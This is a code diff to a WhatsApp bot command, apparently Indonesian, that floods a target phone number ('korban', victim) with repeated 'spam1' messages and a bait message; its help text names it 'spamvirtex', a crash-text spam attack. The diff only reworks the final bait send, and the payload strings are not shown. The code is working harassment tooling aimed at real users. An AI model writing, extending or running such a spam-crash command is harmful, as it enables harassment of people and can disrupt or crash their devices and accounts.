@@ -34,9 +34,9 @@ let handler = async(m, { conn, text, args }) => {
     conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
     conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
     conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
-    conn.sendMessage(korban + '@s.whatsapp.net', {text:umpan}, global.adReply)
-   
-    m.reply(`Sukses`)
+    
+    await conn.sendMessage(korban + '@s.whatsapp.net', {text:umpan}, global.ftroli)
+    await m.reply(`Sukses`)
 }
 handler.help = ['svi nomor', 'spamvirtex nomor']
 handler.tags = ['owner']
